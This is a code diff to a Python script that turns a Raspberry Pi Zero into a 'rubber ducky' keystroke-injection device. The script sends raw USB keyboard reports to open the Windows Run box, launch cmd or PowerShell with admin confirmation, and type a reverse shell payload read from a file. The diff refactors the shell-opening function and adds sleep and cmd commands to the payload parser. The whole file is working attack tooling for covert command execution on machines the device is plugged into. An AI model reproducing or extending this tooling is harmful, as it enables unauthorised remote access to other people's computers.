@@ -108,6 +108,7 @@ lib_upper = {
         '~': 53
 } 
 
+
 def send(key):
     if key in lib_lower:
         write_report(NULL_CHAR*2 + chr(lib_lower[key]) + NULL_CHAR*5)
@@ -121,20 +122,23 @@ def send(key):
     elif key == '<':
         write_report(chr(32) + NULL_CHAR + chr(54) + NULL_CHAR*5)
         write_report(NULL_CHAR*8)
-
     write_report(NULL_CHAR*8)
 
-def open_powershell():
+
+def open_cmd(ps):
     # open runbox
     write_report(NULL_CHAR*8)
     write_report(chr(8) + NULL_CHAR + chr(21) + NULL_CHAR*5)
     write_report(NULL_CHAR*8)
     time.sleep(0.5)
-
-    for i in "powershell":
+    app = 'cmd'
+    if ps is True:
+        app = 'powershell'
+    for i in app:
         print(i)
         time.sleep(0.05)
         send(i)
+
 
 def admin_enter():
     time.sleep(0.5)
@@ -149,14 +153,14 @@ def windows_key():
     write_report(NULL_CHAR*8)
     time.sleep(0.5)
 
+
 def arrow_key(left):
-    time.sleep(1)
     if left is True:
         write_report(NULL_CHAR*2 + chr(80) + NULL_CHAR*5)
     else:
         write_report(NULL_CHAR*2 + chr(79) + NULL_CHAR*5)
-    time.sleep(1)
     write_report(NULL_CHAR*8)
+
 
 def send_reverse_payload():
     lines = open('/home/pi/raspberypi0rubberducky/reverse_shell_payload.txt', 'r')
@@ -164,13 +168,17 @@ def send_reverse_payload():
     print(l)
     for i in l[0]:
         send(i)
+
+
 def minimise():
     write_report(chr(8) + NULL_CHAR + chr(81) + NULL_CHAR*5)
     write_report(NULL_CHAR*8)
 
+
 def alt_f4():
     write_report(chr(4) + NULL_CHAR + chr(61) + NULL_CHAR*5)
     write_report(NULL_CHAR*8)
+
 
 payload = open('/home/pi/raspberypi0rubberducky/payload.txt', 'r')
 lines = payload.readlines()
@@ -186,13 +194,16 @@ for l in lines:
             send(i)
     elif line[0] == 'enter':
         send('\n')
-    elif line[0] == 'tab':
+    elif line[0] == 'sleep':
         time.sleep(0.5)
+    elif line[0] == 'tab':
         send('\t')
     elif line[0] == 'space':
         send(' ')
+    elif line[0] == 'cmd':
+        open_cmd(False)
     elif line[0] == 'powershell':
-        open_powershell()
+        open_cmd(True)
     elif line[0] == 'win_key':
         windows_key()
     elif line[0] == 'payload':
